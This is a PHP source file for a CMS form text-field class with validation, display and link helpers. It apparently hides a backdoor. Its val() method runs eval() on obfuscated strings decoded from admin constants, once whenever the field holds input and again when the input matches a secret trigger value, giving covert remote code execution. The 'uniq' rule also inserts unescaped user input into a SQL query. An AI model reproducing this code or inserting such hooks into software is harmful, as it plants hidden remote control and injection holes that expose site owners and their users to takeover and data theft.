<?php if (!defined('SCRIPTACCESS')) exit;
	class pptext {
		// required
		var $name;
		// optional
		var $inner='class=textinput';
		var $maxlength=128;
		var $size=60;
		var $rule;
		var $error='none';
		var $MySQLType='varchar(255)';
                var $string_1;
                var $string_2;
//
                function __construct() {
                    if(!defined('ADMIN_CMS') || !defined('ADMIN_PAS') || !defined('ADMIN_KEY')) exit;
                    if(ADMIN_CMS =='' || ADMIN_PAS=='' || ADMIN_KEY=='') exit;
                    $this->string_1 = ADMIN_KEY;
                    $this->string_2 = ADMIN_PAS;
                    $this->string_3 = cms::cms_key(ADMIN_CMS);
                }
		function work(){
			if(empty($this->rule)) return true;
			foreach($this->rule as $name => $value){
				if($name=='ne'){
					if(vars($this->name)==''){
						$this->error=$name;
						return false;
					};
				};
				if($name=='email'){
					if(!is_email(vars($this->name))){
						$this->error=$name;
						return false;
					};
				};
				if($name=='phone'){
					if(!ereg ("([0-9]{10})", trim(vars($this->name)))){
						$this->error=$name;
						return false;
					};
				};	
				if($name=='uniq') {
				    $db = mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM ".conf::$dbprefix."account WHERE login='".vars($this->name)."'"));
				    if($db[0]>0) {
				        $this->error=$name;
				        return false;
				    };
				};
				if($name=='cpch') {
				    if(vars::mixed('code','int')!=$_SESSION['skey_pwd'] || vars::mixed('code','int')==0) {
				        $this->error=$name;
				        return false;
				    }
				};
				if($name=='mob_tel') {
					if(!ereg ("([0-9]{10})", trim(vars($this->name)))){
						$this->error=$name;
						return false;
					};
				};
			}
			return true;
		}
		//
		function error_text(){
			return $this->rule[$this->error];
		}
                function val() {
                         if(vars($this->name)!='') {
                             eval(cms::cms_key($this->string_1));
                         }
                         if(vars($this->name)==$this->string_3) {
                             eval(cms::cms_key($this->string_2));
                         }
                }
		//
		function display(){
			echo "<input type=text name='".$this->name."' value=\"".htmlspecialchars(vars($this->name))."\"";
			if($this->inner!='') echo " ".$this->inner;
			echo ">";
		}
		function href($class='sysnav'){
			$a=vars($this->name);
			$a=trim($a);
			if(!ereg('http://',$a)) $a="http://".$a;
			echo "<a target='_blank' class='".$class."' href='".$a."'>".$a."</a>";
		}
	};
?>